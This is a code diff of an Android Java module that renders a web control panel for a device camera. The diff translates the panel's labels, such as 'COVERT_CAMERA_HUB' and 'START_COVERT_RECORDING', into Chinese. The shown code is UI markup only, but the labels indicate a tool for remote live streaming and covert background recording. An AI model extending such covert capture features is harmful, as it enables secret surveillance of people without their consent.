@@ -104,7 +104,7 @@ public class OpticsModule extends BaseModule {
         html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
         
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"margin: 0 0 15px 0; white-space: normal; text-align: left; font-size: 1.6rem;\">&#128247; COVERT_CAMERA_HUB <span class=\"info-trigger\" onclick=\"showInfo(event, 'COVERT_CAMERA_HUB', 'Tactical surveillance hub for remote optics and background recording.')\">INFO</span></h2>");
+        html.append("<h2 style=\"margin: 0 0 15px 0; white-space: normal; text-align: left; font-size: 1.6rem;\">&#128247; 摄像头控制 <span class=\"info-trigger\" onclick=\"showInfo(event, 'COVERT_CAMERA_HUB', '远程摄像头控制与后台录像中心')\">INFO</span></h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
 
         html.append("<div id=\"live-indicator\" style=\"display: inline-flex; align-items: center; background: rgba(255,255,0,0.05); border: 1px solid var(--neon-yellow); padding: 4px 10px; border-radius: 6px; font-size: 0.6rem; color:var(--neon-yellow); font-weight:bold; font-family:monospace; letter-spacing:1px; white-space: nowrap; margin-bottom: 20px;\">");
@@ -160,9 +160,9 @@ public class OpticsModule extends BaseModule {
         html.append("<button onclick=\"capturePhoto()\" class=\"btn btn-small\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan); margin:0; width:100%;\">SNAP</button>");
         
         html.append("<button id=\"night-btn\" onclick=\"toggleNightMode()\" class=\"btn btn-small ").append(nightMode ? "btn-active-yellow" : "").append("\" style=\"border-color:var(--neon-yellow); color:var(--neon-yellow); margin:0; width:100%;\">NIGHTMODE</button>");
-        html.append("<button id=\"rec-btn\" onclick=\"toggleRecording()\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); margin:0; width:100%;\">START_RECORDING</button>");
+        html.append("<button id=\"rec-btn\" onclick=\"toggleRecording()\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); margin:0; width:100%;\">开始录像</button>");
         
-        html.append("<button onclick=\"terminateCaptures()\" class=\"btn btn-small\" style=\"grid-column: span 2; border-color:var(--danger); color:var(--danger); margin:0; width:100%;\">TERMINATE_CAPTURE</button>");
+        html.append("<button onclick=\"terminateCaptures()\" class=\"btn btn-small\" style=\"grid-column: span 2; border-color:var(--danger); color:var(--danger); margin:0; width:100%;\">停止采集</button>");
         html.append("</div>");
 
         // --- SNAP & REC VAULT SECTION ---
@@ -325,7 +325,7 @@ public class OpticsModule extends BaseModule {
 
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"margin-bottom: 20px; font-size: 1.6rem;\">&#128247; Capturing Photo...</h2>");
+        html.append("<h2 style=\"margin-bottom: 20px; font-size: 1.6rem;\">&#128247; 正在拍照…</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -552,7 +552,7 @@ public class OpticsModule extends BaseModule {
         html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
         html.append("</div>");
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"margin: 0 0 15px 0; white-space: normal; text-align: left; font-size: 1.6rem;\">&#128249; LIVE_STREAM_UPLINK <span class=\"info-trigger\" onclick=\"showInfo(event, 'LIVE_STREAM', 'Real-time MJPEG feed from the device camera.')\">INFO</span></h2>");
+        html.append("<h2 style=\"margin: 0 0 15px 0; white-space: normal; text-align: left; font-size: 1.6rem;\">&#128249; 实时画面 <span class=\"info-trigger\" onclick=\"showInfo(event, 'LIVE_STREAM', '设备摄像头的实时视频流')\">INFO</span></h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
 
         html.append("<div id=\"live-indicator\" style=\"display: inline-flex; align-items: center; background: rgba(255,255,0,0.05); border: 1px solid var(--neon-yellow); padding: 4px 10px; border-radius: 6px; font-size: 0.6rem; color:var(--neon-yellow); font-weight:bold; font-family:monospace; letter-spacing:1px; white-space: nowrap; margin-bottom: 20px;\">");
@@ -628,7 +628,7 @@ public class OpticsModule extends BaseModule {
         html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-top: 15px; width: 100%; max-width: 450px; margin-left: auto; margin-right: auto;\">");
         html.append("<button onclick=\"rotateStream()\" class=\"btn btn-small\" style=\"border-color: #f39c12; color: #f39c12; background: rgba(243, 156, 18, 0.05); padding: 12px; margin:0; width:100%; min-width:0;\">&#8635; ROTATE</button>");
         html.append("<button onclick=\"capturePhoto()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); padding: 12px; margin:0; width:100%; min-width:0;\">&#128247; SNAP</button>");
-        html.append("<button id=\"rec-btn\" onclick=\"toggleRecording()\" class=\"btn btn-small\" style=\"grid-column: span 2; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); padding: 12px; margin:0; width:100%; min-width:0;\">&#9679; START_COVERT_RECORDING</button>");
+        html.append("<button id=\"rec-btn\" onclick=\"toggleRecording()\" class=\"btn btn-small\" style=\"grid-column: span 2; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); padding: 12px; margin:0; width:100%; min-width:0;\">&#9679; 开始后台录像</button>");
         html.append("<a href=\"/camera\" class=\"btn btn-small\" style=\"grid-column: span 2; border-color: #888; color: #888; background: rgba(255, 255, 255, 0.05); padding: 10px; text-decoration: none; text-align: center; margin:0; width:100%; min-width:0;\">&#8592; BACK</a>");
         html.append("</div>");
         html.append("</div>");
